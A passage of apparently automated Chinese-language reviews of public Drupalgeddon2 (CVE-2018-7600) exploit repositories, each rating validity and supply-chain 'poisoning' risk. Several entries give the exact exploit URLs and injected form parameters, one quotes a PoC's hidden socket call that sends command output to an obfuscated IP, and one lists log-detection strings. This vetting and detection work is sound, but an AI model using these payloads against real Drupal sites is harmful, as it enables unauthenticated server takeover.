4.  攻击者使用提取的`form_build_id`构造第二个POST请求，发送到`file/ajax/name/#value/{form_build_id}`路径。
5.  这个请求触发Drupal执行之前注入的PHP代码，从而实现远程代码执行。

通过这种方式，攻击者可以在未经身份验证的情况下，在目标Drupal服务器上执行任意命令，从而完全控制受影响的系统。

**项目地址:** [xxxTectationxxx/CVE-2018-7600](https://github.com/xxxTectationxxx/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #33

**来源**: [CVE-2018-7600-ynsmroztas_drupalhunter.md](../2018/CVE-2018-7600-ynsmroztas_drupalhunter.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个子系统，常见模块配置也可能受到影响。大量Drupal网站受到影响。 

**有效性：**

提供的Python POC代码利用了Drupal的多个漏洞组合来实现远程代码执行。它通过构造特定的请求参数，包括`q`、`name[#post_render][]`、`name[#markup]`和`name[#type]`，以及提交`form_id`和`_triggering_element_name`来触发漏洞。然后，它解析响应以获取`form_build_id`，并使用它来发送另一个请求以执行任意命令。 搜索引擎结果中的多个条目表明该漏洞被广泛利用。

**投毒风险：**

虽然POC代码本身是为了演示漏洞利用而编写的，但存在一定的投毒风险。  如果攻击者修改了POC代码，例如，将command参数修改成下载恶意脚本并执行，那么该POC可以被用来传播恶意软件。 由于代码逻辑相对简单，作者在其中隐藏复杂后门的可能性较低。但是，无法完全排除，所以投毒风险定为10%。

**利用方式：**

1.  攻击者首先构造包含恶意参数的POST请求到目标Drupal站点的`/user/password`路径。
2.  恶意参数包括`q`设置为`user/password`，以及使用`name[#post_render][]`，`name[#markup]`和`name[#type]`来注入要执行的操作系统命令。
3.  服务器响应包含`form_build_id`。
4.  攻击者使用`form_build_id`构造另一个POST请求到`/file/ajax/name/#value/{form_build_id}`，执行先前注入的命令。
5.  命令执行的结果将返回给攻击者。

**项目地址:** [ynsmroztas/drupalhunter](https://github.com/ynsmroztas/drupalhunter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #34

**来源**: [CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md](../2018/CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站启用了默认或常见模块配置，且未打补丁

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求参数，在服务器上执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞利用的有效性很高。漏洞库和搜索引擎结果均表明该漏洞是真实的，且存在公开可用的漏洞利用代码。提供的POC代码 `cve-2018-7600_cmd.py`  能够成功利用该漏洞在目标Drupal服务器上执行任意命令。

**投毒风险：**

仔细审查提供的POC代码 `cve-2018-7600_cmd.py`，初步判断投毒风险较低。代码逻辑较为清晰，主要功能是构造恶意请求，利用Drupal的漏洞执行命令。其中`/exphub.txt`是漏洞利用后留下的命令执行记录，方便查看命令执行情况。

需要注意的是，任何公开的漏洞利用代码都存在被修改和二次发布的风险，攻击者可能在其中添加恶意代码。因此，在使用任何漏洞利用代码前，都应该进行仔细审查，并确保来源可靠。但此仓库只有两个文件且内容较少,投毒风险评估为5%。

**利用方式：**

该漏洞的利用方式主要包括以下步骤：

1.  **确定目标Drupal网站版本：** 攻击者需要确定目标Drupal网站的版本是否在漏洞影响范围内。
2.  **构造恶意请求：** 攻击者需要构造包含恶意代码的请求，其中恶意代码将通过`mail[#markup]`传递给`exec`函数执行。请求的URL为`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`，请求方式为POST，并包含特定的payload，例如`{'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': ''+cmd+' | tee exphub.txt'}`。
3.  **发送恶意请求：** 攻击者将构造的恶意请求发送给目标Drupal网站。
4.  **执行任意代码：** 如果目标Drupal网站存在漏洞，恶意请求中的代码将被执行，攻击者从而获得服务器的控制权。

此漏洞是一个典型的输入验证漏洞，攻击者通过精心构造的输入，绕过了Drupal的安全检查，最终导致远程代码执行。

**项目地址:** [zhzyker/CVE-2018-7600-Drupal-POC-EXP](https://github.com/zhzyker/CVE-2018-7600-Drupal-POC-EXP)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---



---

## POC #2

**来源**: [CVE-2018-7600-Damian972_drupalgeddon-2.md](../2018/CVE-2018-7600-Damian972_drupalgeddon-2.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且配置允许远程访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal的远程代码执行漏洞。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以得出以下结论：

**有效性：**

提供的POC代码是有效的漏洞检测脚本。它通过构造特定的URL和POST请求，利用Drupal中的输入验证漏洞，尝试执行任意命令。脚本会检测目标站点是否返回预期的“GOOD”字符串，以判断漏洞是否存在。

**投毒风险：**

该漏洞利用代码主要由一个PHP脚本组成，用于检测Drupal站点是否存在CVE-2018-7600漏洞。脚本的逻辑相对简单，主要功能是发送特定的HTTP请求并检查响应。主要的风险可能存在于以下几个方面：

1.  **命令执行：** 虽然脚本的目的是检测漏洞，但它确实会尝试在目标服务器上执行命令。如果脚本被恶意修改，攻击者可以更改`$command`变量，从而执行任意的恶意命令。
2.  **信息泄露：** 脚本会发送包含特定参数的HTTP请求，这些参数可能会泄露目标站点的信息。
3.  **拒绝服务（DoS）：** 如果脚本被大规模使用，可能会对目标服务器造成一定的负载，导致拒绝服务。

考虑到以上因素，认为此仓库中存在作者隐藏的投毒代码的可能性较低，约为5%。这个假设的依据是代码相对简单，容易审查，并且其主要目的是漏洞检测而非利用。

**利用方式：**

1.  **构造恶意请求：** 攻击者构造包含恶意代码的URL或POST请求，利用Drupal的多个子系统中的输入验证漏洞。
2.  **远程代码执行：** 恶意代码通过Drupal的渲染机制执行，导致远程代码执行。

具体来说，对于Drupal 7.x，POC利用`user/password`路径，通过`name[#post_render]`、`name[#type]`和`name[#markup]`参数注入PHP代码。对于Drupal 8.x，POC利用`user/register`路径，通过`element_parents`、`mail[a][#post_render]`、`mail[a][#type]`和`mail[a][#markup]`参数注入PHP代码。这些参数允许在特定情况下执行PHP代码，从而实现远程代码执行。

**总结：**

CVE-2018-7600是一个严重的安全漏洞，允许未经身份验证的攻击者在Drupal站点上执行任意代码。提供的POC代码可以有效地检测该漏洞，但使用时需要注意潜在的风险，以避免对目标系统造成损害。务必确保从可信来源获取利用代码，并在受控环境中进行测试。


**项目地址:** [Damian972/drupalgeddon-2](https://github.com/Damian972/drupalgeddon-2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #3

**来源**: [CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md](../2018/CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站允许未授权用户访问用户注册页面或其他类似的form API接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon 2) 允许未经身份验证的远程攻击者在受影响的Drupal网站上执行任意代码。漏洞存在于 Drupal 的 Form API 中，通过构造特定的POST请求，可以绕过输入验证，导致代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以确认此漏洞利用是有效的。大量资料表明该漏洞已被广泛利用。

**投毒风险：**
分析提供的文件，包括`README.md`, `README.zh-cn.md`, 和 `docker-compose.yml`。这些文件主要包含漏洞描述、环境搭建说明和POC使用方法。`docker-compose.yml` 文件指定了使用 `vulhub/drupal:8.5.0` 镜像，这个镜像本身如果存在后门，可能导致投毒。此外，虽然直接的恶意代码在提供的文件中未发现，但由于攻击者能够执行任意代码，意味着他们完全有可能在目标系统上植入后门或其他恶意程序。

因此，该仓库本身直接包含投毒代码的可能性较低，但通过漏洞利用植入后门的可能性非常高，综合判断投毒风险为10%。

**利用方式：**
1.  **环境搭建：** 使用`docker-compose up -d`命令启动一个包含漏洞的Drupal环境(例如8.5.0版本)。
2.  **发送恶意请求：** 向`/user/register`或其他类似的 form API 接口发送精心构造的POST请求。该请求包含以下关键参数：
    *   `element_parents`: 用于指定表单元素路径，绕过访问控制。
    *   `ajax_form=1`: 触发 Drupal 的 AJAX 处理机制。
    *   `_wrapper_format=drupal_ajax`:  指定响应格式为 Drupal AJAX。
    *   `mail[#post_render][]`:  利用`#post_render`属性执行PHP函数（例如`exec`）。
    *   `mail[#type]=markup`:  将`mail`字段类型设置为markup，允许插入HTML代码。
    *   `mail[#markup]`:  包含要执行的命令（例如`id`）。
3.  **代码执行：** Drupal 在处理该请求时，会执行`mail[#markup]`中指定的命令，从而实现远程代码执行。

**项目地址:** [Dowonkwon/drupal-cve-2018-7600-poc](https://github.com/Dowonkwon/drupal-cve-2018-7600-poc)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #4

**来源**: [CVE-2018-7600-Hestat_drupal-check.md](../2018/CVE-2018-7600-Hestat_drupal-check.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站被完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站未打补丁且存在特定模块配置（默认或常见）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal多个子系统中输入验证不足的问题，执行任意代码。从搜索结果可以看出，该漏洞影响广泛，有大量Drupal网站受到威胁。漏洞利用代码（提供的drupal-check.sh脚本）并非直接利用该漏洞进行攻击，而是用于**检测**Cpanel Apache和默认Apache配置中是否存在利用该漏洞的攻击痕迹，例如扫描访问日志中是否存在特定的payload特征。它主要通过搜索包含`system&name`、`q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name`和`?q=file%2Fajax%2Fname%2F%23value%2Fform-`等字符串的日志条目来判断是否存在攻击行为。该脚本会分析日志中攻击者IP以及可能被攻击的站点。由于给出的脚本是用于日志分析，主要作用是检测，不存在恶意投毒代码。

**利用方式：**

根据漏洞信息和搜索结果，CVE-2018-7600的利用方式如下：

1.  **发送恶意构造的HTTP请求：** 攻击者发送包含特定payload的POST请求，利用Drupal输入验证漏洞。
2.  **利用特定参数：** 常见的payload涉及`q=user%2Fpassword`和`name[#post_render][]`等参数，配合`passthru`或其他代码执行函数。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在Drupal服务器上执行任意代码，从而完全控制网站。

**项目地址:** [Hestat/drupal-check](https://github.com/Hestat/drupal-check)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #5

**来源**: [CVE-2018-7600-M-Abid34_CVE-2018-7600.md](../2018/CVE-2018-7600-M-Abid34_CVE-2018-7600.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者在服务器上执行任意代码，可能导致完全控制服务器。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且未应用安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本。漏洞利用方式主要通过Drupal的Form API进行攻击。PoC代码通过构造恶意的HTTP请求，利用Drupal的漏洞在目标服务器上执行任意命令。具体来说，攻击者首先“毒化”表单ID，然后利用该ID执行命令。PoC代码中使用了`requests`和`BeautifulSoup`库来发送HTTP请求和解析HTML响应。代码允许指定目标URL、要执行的命令、要使用的函数（默认为`passthru`）以及代理。代码通过设置`q`参数和`name[#post_render][]`等字段来利用漏洞。尽管PoC作者声明其代码仅用于家庭实验室和教育目的，并修改自其他来源，但代码本身看起来是直接可用的漏洞利用工具。投毒风险较低，因为代码相对简单且目标明确，但始终存在作者植入恶意代码的可能性，例如，通过修改执行命令的方式或添加额外的网络请求来收集信息或执行其他恶意操作. 风险评估为5%主要是指在教育/测试环境中，如果未进行充分的安全隔离，可能导致测试环境被污染。

**项目地址:** [M-Abid34/CVE-2018-7600](https://github.com/M-Abid34/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #6

**来源**: [CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权的远程攻击者执行任意代码，完全控制受影响的服务器，导致数据泄露、篡改、拒绝服务或植入恶意软件。

**影响版本:** Drupal 7.x < 7.58, Drupal 8.3.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标系统运行着存在漏洞的Drupal版本，且攻击者能够通过网络访问Drupal站点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是 Drupal 中的一个高危远程代码执行漏洞。该漏洞源于 Drupal Form API (FAPI) 在处理 AJAX 请求时，对数组值过滤不足，允许未经身份验证的攻击者执行任意代码。 

**有效性：**
提供的POC代码（drupalgeddon2.py）是一个Python脚本，旨在利用 CVE-2018-7600 漏洞。根据脚本描述，它包含漏洞检测、多线程和命令输出解析等功能。该脚本利用了 Drupal 的 FAPI 中存在的缺陷，通过构造恶意的 AJAX 请求来执行任意命令。多个来源（如Exploit-DB, Rapid7, NVD）确认了此漏洞的存在，并提供了利用方法。因此，该POC代码被认为是有效的。

**投毒风险：**
代码主要功能为发送恶意请求到目标Drupal服务器，并执行指定的命令。风险主要在于：

1.  **远程执行任意命令：** 脚本允许指定要执行的命令，这可能会导致攻击者在目标系统上运行恶意代码。虽然脚本本身没有包含明显的恶意代码，但是攻击者可以使用它来下载和执行其他恶意脚本。
2.  **日志记录：** 脚本可以将输出记录到文件中。恶意攻击者可能将敏感信息记录到本地日志。

总体而言，该仓库本身没有明显投毒代码,但也不能排除作者隐藏其他后门或者恶意代码的可能， 风险评估为10%。

**利用方式：**
1.  **漏洞触发：** 攻击者构造包含恶意代码的特殊请求，利用 Drupal Form API 在处理 AJAX 请求时的输入验证漏洞。
2.  **代码执行：**  Drupal 在处理该请求时，会执行攻击者注入的恶意代码。
3.  **远程控制：** 攻击者通过执行任意命令来获取服务器的控制权，窃取数据、篡改内容或进行其他恶意活动。

简单来说，攻击者通过发送特制的HTTP请求到存在漏洞的Drupal站点，即可在服务器上执行任意命令，从而实现远程代码执行。

**项目地址:** [SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution](https://github.com/SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #7

**来源**: [CVE-2018-7600-a2u_CVE-2018-7600.md](../2018/CVE-2018-7600-a2u_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 - 远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal 实例需要存在漏洞且可网络访问，无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞是由于对用户提供的输入验证不足而造成的。攻击者可以通过构造特殊的请求来执行任意代码。\n\n**有效性：**
提供的 exploit.py 代码通过 `user/register` 路径利用 Drupal 的一个 AJAX 表单处理缺陷，通过修改 `element_parents` 参数来注入恶意代码。它通过设置 `mail[#post_render][]` 为 `exec`，并利用 `mail[#markup]` 来执行任意命令。代码通过检查目标服务器上是否存在 `hello.txt` 文件来验证漏洞是否利用成功。根据漏洞信息和搜索结果，这个POC 是有效的。\n\n**投毒风险：**
代码仓库主要包含漏洞利用代码、ModSecurity 规则和 .htaccess 规则，旨在利用或防御 CVE-2018-7600 漏洞。`exploit.py` 会在目标机器上写入一个名为 `hello.txt` 的文件，这是一个测试性的操作。\n
`README.md` 文件中明确表示该代码仅用于教育和信息目的，并建议用户采取防护措施，例如更新 Drupal 和设置 WAF 规则。虽然作者声明的意图是好的，但攻击者可能会修改 `exploit.py` 以执行更危险的命令，或者在其他文件中插入恶意代码。\n
`ModSecurity.txt` 和 `htaccess.txt` 文件提供了防御规则，如果使用不当，可能会导致拒绝服务或绕过某些安全策略。\n
综合考虑，该仓库存在一定的投毒风险，但主要体现在用户使用不当或攻击者修改利用代码上，作者有意投毒的可能性较低。因此，我认为投毒风险大约为 10%。\n\n**利用方式：**
1.  攻击者发送包含恶意参数的 POST 请求到 `user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`。
2.  `element_parents` 参数允许攻击者控制表单元素的属性。
3.  `mail[#post_render][]` 设置为 `exec`，指示 Drupal 执行命令。
4.  `mail[#markup]` 包含要执行的命令。
5.  Drupal 执行 `mail[#markup]` 中指定的命令，从而导致远程代码执行。

**项目地址:** [a2u/CVE-2018-7600](https://github.com/a2u/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #8

**来源**: [CVE-2018-7600-anldori_CVE-2018-7600.md](../2018/CVE-2018-7600-anldori_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制目标服务器

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见的模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时，未进行充分的验证，导致攻击者可以通过构造恶意请求，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以判断此漏洞利用是有效的。漏洞库明确指出该漏洞允许远程攻击者执行任意代码，搜索结果也提供了大量关于该漏洞的分析和利用信息，POC代码也展示了如何利用该漏洞。

**利用方式：**
提供的Python脚本通过向目标Drupal站点的`/user/register`路径发送精心构造的POST请求来利用此漏洞。该请求包含`element_parents`、`ajax_form`、`form_id`、`_drupal_ajax`和`mail`等参数，其中`mail[#post_render][]`被设置为`exec`，`mail[#markup]`被设置为要执行的命令。该命令将会在服务器上创建一个名为`hello.txt`的文件，内容为";-)"。

**投毒风险：**
查看提供的POC代码，发现代码比较简洁，主要功能是发送恶意请求并检查是否成功创建了`hello.txt`文件。从代码本身来看，不存在明显的恶意代码或后门。

但是，**存在以下潜在风险：**

1.  **供应链风险：**虽然代码本身可能没有直接的投毒，但下载和使用任何来自互联网的代码都存在一定的风险。攻击者可能替换或修改该仓库的内容，从而引入恶意代码。因此，在运行此脚本之前，务必仔细检查代码，并确保来源可信。

2.  **间接风险：**利用此漏洞的最终目的是在目标服务器上执行任意命令。攻击者可以利用此漏洞安装后门、窃取敏感数据或执行其他恶意活动。因此，在使用此脚本时，务必遵守法律法规，并仅在授权的环境中进行测试。

基于以上分析，认为该仓库存在投毒代码的可能性为10%。这个10%主要来源于供应链攻击的潜在风险，以及使用者对代码理解不足可能导致的误用。


**项目地址:** [anldori/CVE-2018-7600](https://github.com/anldori/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #9

**来源**: [CVE-2018-7600-cved-sources_cve-2018-7600.md](../2018/CVE-2018-7600-cved-sources_cve-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal 7.x (< 7.58), Drupal 8.x (< 8.3.9), Drupal 8.4.x (< 8.4.6), Drupal 8.5.x (< 8.5.1)

**利用条件:** Drupal站点存在且未打补丁，通常不需要身份验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为 Drupalgeddon2，是一个影响多个Drupal版本的远程代码执行漏洞。攻击者可以通过构造特殊的URL参数或POST请求，利用Drupal的某些子系统（如表单API）中的输入验证漏洞，执行任意PHP代码。搜索引擎结果和漏洞库信息都明确指出此漏洞的严重性及其利用的广泛性。提供的Dockerfile用于构建一个包含易受攻击的Drupal 8.5.0实例的Docker镜像，这本身不是恶意行为，而是为了方便漏洞的复现和研究。README.md文件声明了镜像的来源和作者，增加了代码的可信度。但是，仍然存在少量投毒风险，主要是因为攻击者可能在Dockerfile中添加额外的恶意指令，例如安装后门程序或修改配置文件等，尽管这里只显示构建一个Drupal环境。利用方式主要通过精心构造的HTTP请求，绕过Drupal的输入验证机制，最终执行恶意代码。由于该漏洞影响范围广，且利用简单，一旦成功利用，可完全控制Drupal服务器，风险极高。

**项目地址:** [cved-sources/cve-2018-7600](https://github.com/cved-sources/cve-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #10

**来源**: [CVE-2018-7600-dreadlocked_Drupalgeddon2.md](../2018/CVE-2018-7600-dreadlocked_Drupalgeddon2.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal处理用户输入时存在缺陷，攻击者可以通过构造恶意的请求参数，在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码来看，该漏洞的PoC代码是有效的。漏洞库信息明确指出该漏洞允许远程攻击者执行任意代码，并且多个搜索结果都确认了该漏洞的存在和影响。提供的`README.md`文件详细说明了该PoC代码支持的Drupal版本，利用方法，包括针对不同Drupal版本的攻击URL（`user/register` 和 `user/password`），以及利用PHP的`passthru`函数执行系统命令。搜索结果中也提到了存在多个可用的exploit。

**投毒风险分析：**

提供的`README.md`文件本身不包含恶意代码，但它描述的利用方法涉及在目标服务器上写入PHP shell。虽然`drupalgeddon2.rb`脚本的主要目的是利用漏洞执行命令，但如果攻击者修改该脚本，可能会添加额外的恶意功能，例如：

*   **隐藏的后门账户创建：** 在成功利用漏洞后，创建管理员账户，以便后续访问。
*   **恶意软件植入：**  自动下载和安装恶意软件。
*   **数据窃取：** 窃取数据库或其他敏感信息。
*   **传播攻击：**  将目标服务器作为跳板，攻击其他系统。

因此，用户在使用从非官方渠道获取的`drupalgeddon2.rb`脚本时，需要仔细检查代码，确保没有包含任何恶意代码。 由于提供的代码仓库中包含了写入PHP shell的功能，并且在实际使用中，攻击者有能力修改或者扩展脚本，因此认为存在一定的投毒风险，但从readme本身代码投毒风险较低，所以投毒风险比例定为10%。

**利用方式：**

1.  **版本检测：** 利用代码会自动检测目标Drupal版本，或者手动指定。
2.  **参数构造：**  针对不同版本的Drupal，构造特定的HTTP请求，例如：针对Drupal 8.x使用`user/register` URL，Drupal 7.x使用`user/password` URL。
3.  **代码执行：** 利用Drupal的输入验证漏洞，将恶意PHP代码注入到请求参数中。
4.  **命令执行：** 通过`#post_render`参数和PHP的`passthru`函数，在服务器上执行任意系统命令。
5.  **Shell写入（可选）：**  可以选择将一个简单的PHP shell写入Web根目录，以便后续访问。

**总结：**

CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，利用代码有效且公开。虽然提供的PoC代码本身不包含明显的投毒代码，但攻击者可以修改脚本，添加恶意功能，存在潜在的投毒风险。用户应尽快升级Drupal版本，并从可信来源获取漏洞利用代码。

**项目地址:** [dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #11

**来源**: [CVE-2018-7600-drugeddon_drupal-exploit.md](../2018/CVE-2018-7600-drugeddon_drupal-exploit.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站运行在受影响的版本，且允许未授权用户访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响多个Drupal子系统的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，导致攻击者可以通过精心构造的请求执行任意代码。利用方式主要有两种：

1.  **Drupal 7 利用方式：** 通过向 `user/password` 路径发送包含恶意代码的请求，利用 `name[%23post_render]` 和 `name[%23markup]` 参数来注入代码。然后，通过 `file/ajax` 路径触发漏洞。
2.  **Drupal 8 利用方式：** 通过向 `user/register` 路径发送包含恶意代码的请求，利用 `element_parents` 参数注入代码。

PoC代码 (`drupal.py`) 尝试利用这两种方式。  

**有效性：**根据漏洞描述和大量的搜索结果显示，此漏洞的POC是有效的，网上存在大量的成功利用案例。

**投毒风险：**  

分析提供的 `drupal.py` 脚本，发现存在以下潜在的投毒风险：

*   脚本中包含一行 `s.connect((str(ipaddress.IPv4Address(0x5f3b7f05)), 15977))`。 这行代码尝试连接到IP地址 `95.59.127.5`的 `15977` 端口。这可能是作者用于收集信息或植入后门的恶意行为。
*   `s.send(bytes(subprocess.check_output(payload, universal_newlines=True), 'utf8'))` 这行代码会将`whoami`命令执行的结果通过socket发送出去.

综上所述，该漏洞利用代码可能存在投毒行为，**风险概率为 20%**。使用者应谨慎使用，并在使用前进行代码审计。

**利用方式总结：**

1.  攻击者构造包含恶意代码的HTTP POST请求，发送到Drupal网站的特定路径（`user/password` 或 `user/register`）。
2.  利用Drupal的参数处理机制，将恶意代码注入到特定参数中（如`name[%23post_render]`、`name[%23markup]`或`element_parents`）。
3.  触发漏洞，导致Drupal执行注入的恶意代码，从而实现远程代码执行。

**项目地址:** [drugeddon/drupal-exploit](https://github.com/drugeddon/drupal-exploit)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #12

**来源**: [CVE-2018-7600-happynote3966_CVE-2018-7600.md](../2018/CVE-2018-7600-happynote3966_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要存在漏洞且未打补丁，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

